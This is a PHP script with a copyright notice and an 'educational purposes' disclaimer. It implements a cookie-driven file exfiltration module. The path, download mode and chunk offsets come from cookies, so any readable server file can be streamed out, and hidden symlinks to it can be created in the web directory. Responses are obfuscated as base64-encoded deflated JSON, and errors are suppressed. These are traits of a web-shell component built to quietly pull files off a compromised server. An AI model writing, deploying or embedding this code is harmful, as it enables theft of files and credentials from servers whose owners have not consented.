<?php
/*
*     Copyright (c) 2023 SIPHON2
*     All rights reserved.
*    
*     This PHP script, including any associated documentation or files,
*     is the intellectual property of SIPHON2 and is protected by
*     international copyright laws and treaties. Unauthorized copying,
*     distribution, or reproduction of this script, or any portion
*     thereof, is strictly prohibited and may result in severe civil
*     and criminal penalties, as well as liability for monetary damages.
*    
*     You may not use, modify, adapt, merge, sublicense, rent, lease,
*     loan, sell, or otherwise exploit this script without prior
*     written permission from SIPHON2.
*    
*     You are granted a non-exclusive, non-transferable, limited license
*     to use this script solely for non-commercial purposes or for
*     evaluation purposes with the intent to purchase a commercial
*     license. Any use of this script for commercial purposes without
*     a valid commercial license is expressly prohibited.
*    
*     This script is provided "as is" without any warranties of any kind,
*     whether express or implied. SIPHON2 shall not be liable for any
*     damages, including but not limited to, direct, indirect, special,
*     incidental, or consequential damages or loss of data, even if
*     advised of the possibility of such damages.
*    
*     For inquiries regarding licensing or to obtain written permission
*     to use this script for any purpose not expressly permitted in this
*     notice, please contact SIPHON2 at siphon4545@gmail.com.
*
*
*
*
*
*
*     ---------------------------------------------------------------------------

*     #######################################
*     ##  READ CAREFULLY BEFORE PROCEED!!! ##
*     #######################################

*     This PHP script is intended solely for educational purposes.
*     It is meant to be used as a learning resource and for understanding
*     specific concepts.
*    
*     WARNING: Use this script responsibly and at your own risk. The author
*     (SIPHON2) of this script shall not be liable for any direct, indirect,
*     special, incidental, or consequential damages arising from the use or
*     misuse of this script. The users of this script are solely responsible
*     for any consequences that may occur while using this script. Think twice
*     about the potential consequences and ensure that you have proper
*     authorization before using any part of this script in any environment.
*    
*     By using this script, you agree to accept all risks and responsibilities
*     associated with its usage. If you do not agree with these terms, do not
*     proceed to use this script.
*    
*     Please be reminded that you, and only you, are solely responsible for your
*     actions. Always adhere to responsible and ethical coding practices, and
*     ensure to obtain proper authorization before running any script in a live
*     or production environment.

*     YOUR ACTIONS CARRY CONSEQUENCES, SO THINK TWICE BEFORE PROCEEDING.
*     
*     ---------------------------------------------------------------------------
*/




$start = microtime(true);

$arguments = [
    "level" => isset($_COOKIE["level"]) ? (int)$_COOKIE["level"] : 9,                         // Level of gzdefalte  compression
    "path" => isset($_COOKIE['path']) ? $_COOKIE['path'] : __FILE__,                          // File path to be downloaded
    "mode" => isset($_COOKIE['mode']) ? $_COOKIE['mode'] : 'stream',                          // 3 modes are supported: stream, direct and chunk download
    "compress" => isset($_COOKIE['compress']) ? ($_COOKIE['compress'] === 'true') : false,    // Compress stream data with level 9 (gzip encodation)
    "chunk_start" => isset($_COOKIE['start']) ? (int)$_COOKIE['start'] : 0,                   // Chunk start from
    "chunk_end" => isset($_COOKIE['end']) ? (int)$_COOKIE['end'] : 4000                       // Chunk end at
];

function uuid()
{
    // Creates a unique UUID
    $data = random_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

function DOWNLOAD_FILE()
{
    global $arguments, $start;
    extract($arguments, EXTR_SKIP);
    $debug = [];
    $data = [];

    if (file_exists($path))
    {
        if ($mode == 'stream')
        {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            if ($compress)
            {
                header('Content-Encoding: gzip');
                $compressedContent = gzencode(file_get_contents($path), 9);
                header('Content-Length: ' . strlen($compressedContent));
                echo $compressedContent;
                return;
            }
            else
            {
                header('Content-Length: ' . filesize($path));
                readfile($path);
                return;
            }
        }
        elseif ($mode == 'direct')
        {
            if (PHP_OS === 'WIN32' || PHP_OS === 'WINNT')
            {
                @array_push($debug, ['warning' => 'direct downloads are not supported in windows environment']);
            }
            else
            {
                $uid = uuid();
                if (!symlink($path, __DIR__.'/.'.$uid))
                {
                    @array_push($debug, ['warning' => 'unable to create symlink to `'.$path.'`']);
                }
                else
                {
                    $server_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
                    // header('Location: ' . $server_url.'/.'.$uid);
                    $data['link'] = $server_url.'/.'.$uid;
                    $data['directory'] = __DIR__.'/.'.$uid;
                }
            }
        }
        elseif ($mode == 'chunks')
        {
            // header('Content-Type: application/octet-stream');
            // header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            // header('Content-Length: ' . filesize($path));
            // if ($compress)
            // {
            //     ob_start("ob_gzhandler");
            //     header('Content-Encoding: gzip');
            // }
            // $file = fopen($path, 'rb');
            // while (!feof($file))
            // {
            //     echo fread($file, $chunk);
            //     ob_flush();
            //     flush();
            // }
            // fclose($file);

            $fileSize = filesize($path);
            $chunkSize = $chunk_end - $chunk_start + 1;
            header('HTTP/1.1 206 Partial Content');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            header('Accept-Ranges: bytes');
            header("Content-Range: bytes $chunk_start-$chunk_end/$fileSize");
            header('Content-Length: ' . $chunkSize);
            if ($compress)
            {
                ob_start("ob_gzhandler");
                header('Content-Encoding: gzip');
            }
            $file = fopen($path, 'rb');
            fseek($file, $chunk_start);
            $remainingBytes = $chunkSize;
            while ($remainingBytes > 0 && !feof($file))
            {
                $bytesToRead = min(1024 * 1024, $remainingBytes);
                $buffer = fread($file, $bytesToRead);
                echo $buffer;
                $remainingBytes -= strlen($buffer);
                ob_flush();
                flush();
            }
            fclose($file);
        }
    }
    else
    {
        @array_push($debug, ['error' => 'unable to locate `'.$path.'`']);
    }

    $response = json_encode([
        'status' => empty($debug),
        'time' => microtime(true) - $start,
        'debug' => $debug,
        'operation' => [
            'action' => __FUNCTION__,
            'arguments' => $arguments
        ],
        'data' => $data
    ], JSON_UNESCAPED_UNICODE);

    echo trim(base64_encode(gzdeflate($response, $level)), '=');
    // echo $response;
}

@DOWNLOAD_FILE();


?>
